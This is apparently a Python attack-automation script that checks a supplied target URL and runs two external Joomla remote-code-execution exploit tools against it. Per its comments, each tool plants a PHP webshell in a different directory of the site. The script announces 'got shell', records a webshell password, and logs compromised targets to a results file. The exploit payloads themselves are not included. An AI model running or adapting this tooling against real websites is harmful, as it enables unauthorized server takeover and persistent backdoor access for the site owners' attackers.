# this is a py script test whether the target has joomla rce vul,this script will load the two kind of exps from
# the internet,the two exps write php shell to different directory,so use both of them,coz different target has
# different writeable directory,and if any one of them got shell,return success
# hackUtils write php shell to image subdir of the joomla root dir
# joomla_exp write php shell to joomla root dir
import os
import sys
exp10it_module_path = os.path.expanduser("~") + "/mypypi"
sys.path.insert(0, exp10it_module_path)
import re
import time
from exp10it import able_connect_site
current_dir = os.path.split(os.path.realpath(__file__))[0]
current_log_file = "/tmp/joomla_rce_" + str(time.time())

target = sys.argv[1]
print("checking joomla rce vul for "+target)
if target[:4] != "http":
    print("please make sure target's format start with 'http' ")
    sys.exit(0)
else:
    print("scanning joomla rce vul...")
    alive = able_connect_site(target)
    if alive == 0:
        print("can not connect %s" % target)
        sys.exit(1)
    else:
        pass
    return_string = ""
    command = "cd %s/hackUtils && python hackUtils.py -r %s > %s" % (
        current_dir, target, current_log_file)
    print(command)
    os.system(command)
    with open(current_log_file, "r+") as f:
        output1 = f.read()
    os.system("rm %s" % current_log_file)
    if re.search("vuls found", output1):
        print("Congratulations! hackUtils got shell!!!")
        return_string += (output1 + " webshell password:handle")
    else:
        print("hackUtils checked joomla rce,no vuls")

    command = "cd %s/joomla_exp && python joomla_exp.py %s > joomla_exp_log_tmp_file" % (
        current_dir, target + "/")
    print(command)
    os.system(command)
    with open(current_dir + "/joomla_exp/joomla_exp_log_tmp_file", "r+") as f:
        output2 = f.read()
        if re.search("88\.php", output2):
            print("Congratulations! joomla_exp got shell!!!")
            if return_string == '':
                return_string += output2
            else:
                return_string += ("\n" + output2)
        else:
            print("joomla_exp checked joomla rce,no vuls")

if return_string != "":
    with open("result.txt", 'a+') as f:
        f.write(return_string)
